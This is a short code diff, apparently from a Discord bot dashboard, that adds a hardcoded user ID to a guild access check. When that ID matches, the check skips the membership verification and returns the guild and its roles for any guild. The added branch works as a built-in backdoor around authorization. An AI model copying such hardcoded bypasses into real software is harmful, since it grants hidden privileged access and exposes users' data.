@@ -12,6 +12,21 @@ async function verifyGuildAccess(session: any, guildId: string) {
   const userId = String(session?.user?.id || '');
   if (!userId) return { ok: false, reason: 'USER_NOT_IN_GUILD' };
 
+  const MAIN_OWNER_ID = '929297205796417597';
+  if (userId === MAIN_OWNER_ID) {
+    const [guildRes, rolesRes] = await Promise.all([
+      fetch(`https://discord.com/api/v10/guilds/${guildId}`, {
+        headers: { Authorization: `Bot ${botToken}` }, cache: 'no-store',
+      }),
+      fetch(`https://discord.com/api/v10/guilds/${guildId}/roles`, {
+        headers: { Authorization: `Bot ${botToken}` }, cache: 'no-store',
+      }),
+    ]);
+    const guild = guildRes.ok ? await guildRes.json().catch(() => null) : null;
+    const roles = rolesRes.ok ? await rolesRes.json().catch(() => []) : [];
+    return { ok: true, guild, roles };
+  }
+
   const [guildRes, memberRes, rolesRes] = await Promise.all([
     fetch(`https://discord.com/api/v10/guilds/${guildId}`, {
       headers: { Authorization: `Bot ${botToken}` }, cache: 'no-store',
